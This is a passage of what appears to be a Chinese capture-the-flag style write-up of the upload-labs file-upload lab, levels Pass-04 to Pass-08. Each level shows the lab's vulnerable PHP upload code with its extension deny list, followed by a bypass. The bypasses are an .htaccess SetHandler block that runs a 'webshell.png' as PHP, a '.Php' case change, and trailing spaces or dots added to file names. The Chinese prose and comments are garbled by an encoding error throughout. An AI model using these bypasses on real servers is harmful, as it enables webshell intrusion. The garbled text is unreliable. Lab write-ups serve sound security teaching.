class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-2"><a href="#è§£æ³•-2" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™ä¸‹ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹æœ‰å¾ˆå¤šç§ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶æ¥æŠŠ<code>.png</code>æ–‡ä»¶è§£æä¸º<code>.php</code>ç±»å‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;webshell.png&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-3"><a href="#è§£æ³•-3" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>ç›¸æ¯”ä¸ç¬¬å››å…³ï¼Œç¬¬äº”å…³å°‘äº†è½¬æ¢ä¸ºå°å†™çš„è¿™ä¸€æ­¥éª¤ï¼Œå› æ­¤å¯ä»¥å°è¯•ä¿®æ”¹ä¸º<code>.Php</code>åç¼€ä¸Šä¼ ï¼Œè¿æ¥æˆåŠŸã€‚</p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-4"><a href="#è§£æ³•-4" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™æ¬¡çš„ä»£ç å’Œä¹‹å‰ç›¸æ¯”å°‘äº†é¦–å°¾å»ç©ºï¼Œå› æ­¤å¯ä»¥å°è¯•åœ¨æœ«å°¾åŠ ä¸Šç©ºæ ¼ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨æœ¬åœ°æ˜¯æ— æ³•åœ¨æœ«å°¾æ·»åŠ ä¸Šç©ºæ ¼çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨burpsuiteæŠ“åŒ…ä¸­ä¿®æ”¹ä¸Šä¼ çš„æ–‡ä»¶<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673682906593-0bfa79c4-182f-48d5-b349-280cda650687.png" alt="e4d6f42cc4fc3bf888b6ceb79f1001e.png"><br>è¿™æ ·å°±å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚</p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-5"><a href="#è§£æ³•-5" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™æ¬¡ç¼ºå°‘äº†åˆ é™¤æ–‡ä»¶æœ«å°¾çš„ç‚¹ï¼Œå› æ­¤å¯ä»¥åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ç‚¹æ¥ç»•è¿‡ï¼Œè¿˜æ˜¯ç›´æ¥åœ¨bpä¸­ä¿®æ”¹æ–‡ä»¶åå¹¶ä¸Šä¼ å³å¯ã€‚</p><h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-6"><a href="#è§£æ³•-6" class="headerlink" 